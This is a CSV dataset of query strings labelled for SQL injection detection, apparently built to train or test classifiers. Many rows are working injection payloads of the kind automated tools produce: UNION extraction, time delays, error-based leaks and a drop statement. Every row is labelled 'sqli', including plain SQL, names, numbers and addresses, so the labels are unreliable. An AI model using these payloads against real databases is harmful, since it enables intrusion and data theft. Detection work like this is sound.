query,label
select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sqli
SELECT AVG ( shallow ) FROM donkey,sqli
1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,sqli
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4142  =  4142",sqli
SELECT * FROM fellow FETCH FIRST 50 PERCENT ROWS ONLY,sqli
"INSERT INTO standard  ( pond, real, tune )  VALUES  ( 'choice', 'sudden', 'tax' )  ",sqli
"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",sqli
SELECT * FROM spite FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM describe,sqli
"-3954'   )    )    union all select 2417,2417--",sqli
-6453%'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   '%'  =  ',sqli
"iif  (  4436  =  8910,1,1/0  )  ",sqli
58305784w,sqli
"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
crabe,sqli
62145911a,sqli
catalda,sqli
"  SELECT POSITION ( ""3"" IN ""W3Schools.com"" )  AS MatchPosition;",sqli
lucila2,sqli
6959240000000000,sqli
FROM  ( SELECT DISTINCT building FROM win ) ,sqli
"1""  )   as dfmm where 7563  =  7563 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
SELECT * FROM they WHERE element LIKE '%luck%',sqli
"1""  )   where 8612  =  8612",sqli
adolfo,sqli
"1""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""isbh"" like ""isbh",sqli
SELECT * FROM sudden WHERE ourselves = 'stairs' FETCH FIRST 3 ROWS ONLY,sqli
SELECT * FROM perfectly WHERE canal = 'sum'  AND City = 'belt',sqli
SELECT * FROM fell WHERE engineer NOT LIKE '[basket]%',sqli
toolbox,sqli
"  SELECT BINARY ""W3Schools.com"";",sqli
"-3731'   )    )     )   or elt  (  7540  =  1412,1412  )   and    (    (     (  'iwch'  =  'iwch",sqli
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   6977  =  6977",sqli
geldres pittaluga,sqli
vaquer gorigoitia,sqli
cedric,sqli
kirland-lincovsky@la-sexta-f1.fo,sqli
5ecom058a?8a,sqli
"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""utzr"" like ""utzr",sqli
"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",sqli
SELECT * FROM announced WHERE bite LIKE '%well%',sqli
-7675%'   )    )     )   order by 1--,sqli
micr6pil8,sqli
"-8046""   )    )     )   union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",sqli
otxandio,sqli
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""xhvo""  =  ""xhvo",sqli
"-5672%"" or 3825  =  9675--",sqli
"-9929'  )   as gbtc where 8162  =  8162 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli
SELECT * FROM cut,sqli
livio,sqli
SELECT * FROM individual 3 SELECT * FROM gradually,sqli
"   SELECT chest, rice+ ', ' + cover+ ' ' + shoot+ ', ' + know AS tomorrow  FROM exclaimed",sqli
1'  )   as syer where 3141  =  3141 rlike   (  select   (  case when   (  6233  =  7567  )   then 1 else 0x28 end   )    )   --,sqli
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",sqli
-6179   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   7732  =  7732,sqli
faix,sqli
1'+  (  select ksoh where 6339  =  6339,sqli
shedd,sqli
1'  )   as qcse where 4147  =  4147 waitfor delay '0:0:5'--,sqli
"INSERT INTO pressure ( giving, prize, powder, mail, work, common )  VALUES  ( 'chosen', 'roll'. characteristic', 'somebody', 'soon', 'before', 'rest' )  ",sqli
64633352v,sqli
"1' where 3339  =  3339 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",sqli
71404358f,sqli
" select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",sqli
lugar grela 152 1?f,sqli
1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,sqli
26241,sqli
 (  select 2412  =    (  'qqpjq'||  (  select case 2412 when 2412 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    ) ,sqli
"calle archidona 27, 11?a",sqli
"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
whipp@esmeraldas.org.tm,sqli
74,sqli
gwohsing,sqli
"1%'   )    )    union all select null,null,null,null,null,null#",sqli
"1""   )    )    as dpln where 4193  =  4193 rlike sleep  (  5  )  --",sqli
6202740000000000,sqli
"1'  )   where 7391  =  7391 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sqli
" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",sqli
"1  )   as fgqe where 1526  =  1526 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sqli
SELECT * FROM operation  WHERE lesson NOT LIKE '[rule]%',sqli
-3359' order by 1--,sqli
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",sqli
"1' and elt  (  1533  =  5695,5695  )   and 'ycgi'  =  'ycgi",sqli
-1866'   )    )    as cwtv where 3295  =  3295 order by 1--,sqli
SELECT cup FROM last UNION SELECT stay FROM soap ORDER BY outside,sqli
SELECT * FROM myself WHERE effort BETWEEN 'yet' AND 'diagram',sqli
trespaderne,sqli
"1""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""znzb"" like ""znzb",sqli
"1' in boolean mode  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #",sqli
"SELECT * FROM west WHERE wide BETWEEN ""information"" AND    ""stomach""",sqli
"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",sqli
idt,sqli
"  SELECT tried,accurate,stared FROM fellow LEFT JOIN Orders ON lose.happenID =  broke.list ORDER BY tribe.husband",sqli
SELECT known ( s )  FROM usually,sqli
-9405' union all select 2539--,sqli
SELECT mother ( s )  FROM owner,sqli
SELECT * FROM fifth WHERE rocket = 'power'  AND  ( mighty = 'zoo' OR heart = 'sharp' ) ,sqli
"   SELECT suppose, direction, nor FROM game WHERE president  IS NULL",sqli
" select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",sqli
1'+  (  select 'vjoj' where 5348  =  5348,sqli
florian@alcantarapartners.so,sqli
"  SELECT * FROM shirt WHERE contrast NOT IN  ( 'got', 'receive', 'riding' )  ",sqli
26586,sqli
SELECT care ( s FROM charge RIGHT JOIN,sqli
"-8454"" or 6872  =  6872",sqli
SELECT dollar,sqli
"-2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646--",sqli
zonc4o,sqli
SELECT led FROM camera UNION SELECT claws FROM hello ORDER BY outside,sqli
SELECT * FROM sink WHERE create = 'important',sqli
24324,sqli
-3125'   )    )     )   order by 1#,sqli
lapidificar,sqli
"1'||  (  select 'uyfo' where 1236  =  1236 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",sqli
c8nde9a,sqli
broquel,sqli
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""ureu"" like ""ureu",sqli
-2820'   )    )    or 6679  =  8848--,sqli
1'||  (  select 'brde' where 7390  =  7390 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',sqli
"' UNION SELECT price, email FROM sessions --",sqli
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",sqli
"   SELECT COUNT ( roll ) , field FROM die BY are",sqli
"1  )   union all select null,null#",sqli
SELECT MIN ( happily )  AS exactly FROM blew,sqli
"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",sqli
DELETE FROM hot,sqli
"martel 153,",sqli
SELECT AVG ( rubbed ) FROM original,sqli
amalio,sqli
SELECT * FROM garden WHERE mood BETWEEN 'possible' AND 'wood',sqli
"1%"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,sqli
dra2atizar,sqli
SELECT option_value FROM wp_options WHERE option_name  =  'classic-editor-allow-users' LIMIT 1,sqli
"  SELECT ROUND ( 345.156,   0 ) ;",sqli
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 189 )  ORDER BY meta_id ASC",sqli
1'   )    )    as yyrx where 5600  =  5600,sqli
"-3452%' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  '",sqli
SELECT * FROM thread FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM president,sqli
4176,sqli
"1'+  (  select pdfv where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",sqli
 (  select   (  case when   (  3348  =  1710  )   then 3348 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,sqli
"1""  )   where 8657  =  8657",sqli
SELECT noon ( s FROM came RIGHT JOIN,sqli
SELECT * FROM fact WHERE four = 'pound'  OR darkness = 'remember',sqli
SELECT * FROM buffalo,sqli
" SELECT * FROM equipment ORDER BY rhythm, least",sqli
"iif  (  7953  =  3021,1,1/0  )  ",sqli
SELECT * FROM clear  WHERE continued = how,sqli
SELECT AVG ( rocket )  FROM scientist  SELECT SUM ( gently ) ,sqli
"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",sqli
zahn,sqli
linero-noro@cocheacoche.uy,sqli
SELECT * FROM welcome,sqli
3245450000000000,sqli
SELECT equator,sqli
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'vwtq'  =  'vwtq",sqli
SELECT * FROM discover WHERE stems = 'church'  OR pilot = 'coach',sqli
42782721f,sqli
22532,sqli
1'   )    )    as dqby where 9256  =  9256,sqli
SELECT * FROM per WHERE plus BETWEEN '1996-07-01' AND '1996-07-31',sqli
"1%""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,sqli
"1%""   )    )     )   union all select null,null,null,null,null--",sqli
"1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sqli
SELECT TOP 3 * FROM discuss,sqli
SELECT * FROM friend 3 SELECT * FROM percent,sqli
05072293b,sqli
"1""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
SELECT TOP 3 * FROM within SELECT * FROM soil 3SELECT * FROM white,sqli
SELECT COUNT ( DISTINCT learn )  FROM customs,sqli
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'csmu'  =  'csmu",sqli
SELECT * FROM pride FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grandfather,sqli
SELECT COUNT ( question ) FROM produce,sqli
SELECT * FROM eleven  WHERE tried = labor,sqli
SELECT * FROM instead WHERE solar LIKE '%create%',sqli
harshad,sqli
select   (  case when   (  8350  =  7872  )   then 8350 else 8350*  (  select 8350 from information_schema.character_sets  )   end  )  #,sqli
1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',sqli
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'sqvt' like 'sqvt,sqli
SELECT * FROM not WHERE change BETWEEN '1996-07-01' AND '1996-07-31',sqli
"INSERT INTO loose  ( exercise, struck, chosen )  VALUES  ( 'yet', 'importance', 'tomorrow' )  ",sqli
"-9392   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   2975  =  2975",sqli
46593,sqli
"1%'   )    )     )   union all select null,null--",sqli
"1   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  5340  =  5340",sqli
"  SELECT * FROM wood WHERE empty IN  ( 'stay', 'scale', 'beginning' )  ",sqli
"1   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   3003  =  3003",sqli
monvar/monver,sqli
magrath,sqli
"  SELECT Orders.presentrID, Employees.bent, Employees.mathematics FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.shareID ORDER BY Orders.dependID",sqli
222584000000000,sqli
"admin""  )   or ""1""  =  ""1""/*",sqli
"1"" where 8635  =  8635 and 4595  =  4595#",sqli
"-2667  )   union all select 5848,5848,5848,5848--",sqli
1'  )   where 2928  =  2928 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sqli
SELECT basis ( s )  FROM why UNION ALL,sqli
"1%""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
aguarn,sqli
"  UPDATE road SET separate =  'particular', City =  'freedom' WHERE chapter =  favorite",sqli
1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,sqli
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",sqli
mccreano,sqli
SELECT * FROM bit WHERE sport NOT BETWEEN 'frog' AND 'cattle',sqli
SELECT TOP 50 PERCENT * FROM enter SELECT * FROM soldier FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM property,sqli
4or6un0,sqli
19310,sqli
SELECT * FROM grain WHERE positive = 'matter'  OR remember = 'warm',sqli
3041,sqli
SELECT TOP 50 PERCENT * FROM railroad SELECT * FROM opposite FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pink,sqli
real de montroi,sqli
31410,sqli
"1' where 2774  =  2774 union all select null,null,null,null,null#",sqli
"1   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   3038  =  3038",sqli
1'  )   waitfor delay '0:0:5' and   (  'fpnh'  =  'fpnh,sqli
xtiva,sqli
select   (  case when   (  4059  =  7807  )   then 4059 else 1/  (  select 0  )   end  )  --,sqli
"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- zvkh",sqli
"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""pfea""  =  ""pfea",sqli
"SELECT * FROM parts WHERE storm BETWEEN ""part"" AND    ""tears""",sqli
select sleep  (  5  )   and 'gajm'  =  'gajm,sqli
SELECT map ( s )  FROM outside LEFT JOIN,sqli
SELECT behavior ( s )  FROM enjoy FULL OUTER JOIN,sqli
"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",sqli
56876281h,sqli
SELECT TOP 3 * FROM president WHERE too = 'choose' SELECT * FROM effect,sqli
if  (  5127  =  2829  )   select 5127 else drop function okos--,sqli
"1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'qdij'  =  'qdij",sqli
"1%"" union all select null,null,null,null,null,null,null--",sqli
06226784v,sqli
"1'  )   as bxae where 4143  =  4143 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",sqli
"-9297  )   union all select 6841,6841,6841,6841,6841--",sqli
"1%'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  '%'  =  '",sqli
SELECT AVG ( radio ) FROM plane SELECT SUM ( coach ) ,sqli
"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""ampn"" like ""ampn",sqli
natver,sqli
"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""vhmc""  =  ""vhmc",sqli
SELECT AVG ( first ) FROM compass SELECT SUM ( chair ) ,sqli
SELECT * FROM deeply,sqli
calle constanti s/n 5?h,sqli
SELECT * FROM low  WHERE girl NOT LIKE '[courage]%',sqli
"1""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
  )   or   (  'a'  =  'a,sqli
SELECT Count ( * )  AS mine,sqli
"  SELECT strong,degree FROM shut WHERE specific = 'chest' UNION SELECT gun, traffic FROM won",sqli
